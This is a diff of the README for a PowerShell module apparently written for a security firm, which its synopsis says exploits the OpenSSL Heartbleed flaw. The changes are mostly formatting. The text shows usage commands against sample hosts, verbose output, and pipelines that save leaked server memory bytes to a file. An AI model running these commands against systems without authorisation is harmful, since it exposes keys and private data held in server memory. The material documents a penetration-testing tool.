@@ -10,15 +10,16 @@ heartbeat support is ascertained in the initial check.   This can be modified wi
 and Heartbeats parameters.  By default, a random delay is introduced between heartbeats
 which can be disabled if desired also.
 
-**Author: Joff Thyer, April-May 2014
-**Concept suggestion by Tim Tomes.
+**Author: Joff Thyer, April-May 2014**
+
+**Concept suggestion by Tim Tomes.**
+
 
 ## Sponsors
 
 [![Black Hills Information Security](http://www.blackhillsinfosec.com/_images/BHIS-Logo.png)](http://www.blackhillsinfosec.com)
 
 
-<#
 .SYNOPSIS
 
 Exploit the OpenSSL 1.0.1 - 1.0.1f TLS HeartBeat vulnerability.
@@ -81,23 +82,21 @@ http://packetstormsecurity.com/files/126070/Heartbleed-Proof-Of-Concept.html
 
 .NOTES
 
-**Author: Joff Thyer, April 2014**
-**Version: 20140501-1011** 
-**Acknowledgments to Tim Tomes.**
+**Author: Joff Thyer, April 2014
+**Version: 20140501-1011
+**Acknowledgments to Tim Tomes.
 
 .EXAMPLE
 
 Usage example within CMD.EXE only.  Assumes that module is contained within
 current working directory.
 
-C:\>        powershell -command (Import-Module ./powerbleed.psm1); Test-Heartbleed -Computername 10.10.1.150 -Verbose
-
+C:\> `powershell -command (Import-Module ./powerbleed.psm1); Test-Heartbleed -Computername 10.10.1.150 -Verbose`
 
 Powershell interactive usage examples:
 
-PS C:\>         Import-Module ./powerbleed.psm1
-
-PS C:\>         Test-Heartbleed -Computername 10.10.1.150 -Heartbeats 5 -HBLen 32767 -Verbose
+PS C:\> `Import-Module ./powerbleed.psm1`
+PS C:\> `Test-Heartbleed -Computername 10.10.1.150 -Heartbeats 5 -HBLen 32767 -Verbose`
 
 VERBOSE: Testing 10.10.1.150
 VERBOSE: Sending Heartbeat support test packet
@@ -111,39 +110,21 @@ VERBOSE: : 24113 bytes returned from server. (65579 total bytes)
 
 Can also use the powershell pipeline to write bytes out to a file like this:
 
-PS C:\> Test-Heartbleed -Computername 10.10.1.150 | `
-              Select-Object -ExpandProperty Bytes | `
-              Set-Content -Encoding Byte -Path ./file.txt
+PS C:\> `Test-Heartbleed -Computername 10.10.1.150 |
+		Select-Object -ExpandProperty Bytes |
+		Set-Content -Encoding Byte -Path ./file.txt`
 
-PS C:\> Test-Heartbleed -Computername 10.10.1.150 | Select-Object -ExpandProperty Bytes | Set-Content -Encoding Byte -Path ./file.txt
-
+PS C:\> `Test-Heartbleed -Computername 10.10.1.150 | Select-Object -ExpandProperty Bytes | Set-Content -Encoding Byte -Path ./file.txt`
 
 Or as a one line command with no pipeline with the -WriteFile argument.
 
-PS C:\blah> Test-Heartbleed -Computername 10.10.1.150 -WriteFile
-PS C:\blah> ls
-
-    Directory: C:\blah
-
-Mode                LastWriteTime     Length Name
-----                -------------     ------ ----
--a---          5/1/2014  10:08 AM       5793 10.10.1.150-port443-hb.dat
--a---          5/1/2014  10:08 AM      16179 powerbleed.psm1
-
+PS C:\> `Test-Heartbleed -Computername 10.10.1.150 -WriteFile`
 
 
 Other examples:
 
-PS C:\> Test-Heartbleed -Computername 10.10.1.150 -Heartbeats 3 -TLSTries 3 -NoRandomDelay -Verbose
+PS C:\> `Test-Heartbleed -Computername 10.10.1.150 -Heartbeats 3 -TLSTries 3 -NoRandomDelay -Verbose`
 
-PS C:\> Test-Heartbleed -Computername smtp.domain.tld -Port 25 -STLSProto SMTP -Verbose
-VERBOSE: Testing smtp.domain.tld
-VERBOSE: Sending Heartbeat support test packet
-VERBOSE: smtp.domain.tld does not support TLS heartbeat.
+PS C:\> `Test-Heartbleed -Computername smtp.domain.tld -Port 25 -STLSProto SMTP -Verbose`
 
-Host                    Bytes                        Vulnerable String
-----                    -----                        ---------- ------
-smtp.domain.tld         {0}                          False
-
-#>
 
